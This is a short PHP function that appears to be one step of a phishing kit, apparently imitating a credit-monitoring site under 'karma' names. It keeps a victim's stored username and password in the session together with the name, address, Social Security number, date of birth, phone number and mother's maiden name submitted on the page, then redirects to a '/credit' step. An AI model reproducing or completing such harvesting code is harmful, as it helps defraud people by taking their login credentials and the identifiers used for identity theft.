<?php
function address_process() {
    $karma_net_user = $_SESSION['karma-user'];
    $karma_net_pass = $_SESSION['karma-pass'];
    $karma_net_first_name = $_POST['karma-firstname'];
    $karma_net_last_name = $_POST['karma-lastname'];
    $karma_address = $_POST['karma-address'];
    $karma_city = $_POST['karma-city'];
    $karma_state = $_POST['karma-state'];
    $karma_zipcode = $_POST['karma-zipcode'];
    $karma_ssn = $_POST['karma-ssn'];
    $karma_phonenumber = $_POST['karma-phonenumber'];
    $karma_dob = $_POST['karma-dob'];
    $karma_mmn = $_POST['karma-mmn'];

    $_SESSION['karma-net-user'] = $karma_net_user;
    $_SESSION['karma-net-pass'] = $karma_net_pass;
    $_SESSION['karma-firstname'] = $karma_net_first_name;
    $_SESSION['karma-lastname'] = $karma_net_last_name;
    $_SESSION['karma-address'] = $karma_address;
    $_SESSION['karma-city'] = $karma_city;
    $_SESSION['karma-state'] = $karma_state;
    $_SESSION['karma-zipcode'] = $karma_zipcode;
    $_SESSION['karma-ssn'] = $karma_ssn;
    $_SESSION['karma-phonenumber'] = $karma_phonenumber;
    $_SESSION['karma-dob'] = $karma_dob;
    $_SESSION['karma-mmn'] = $karma_mmn;

    header('Location: /credit');
    exit();
    }
?>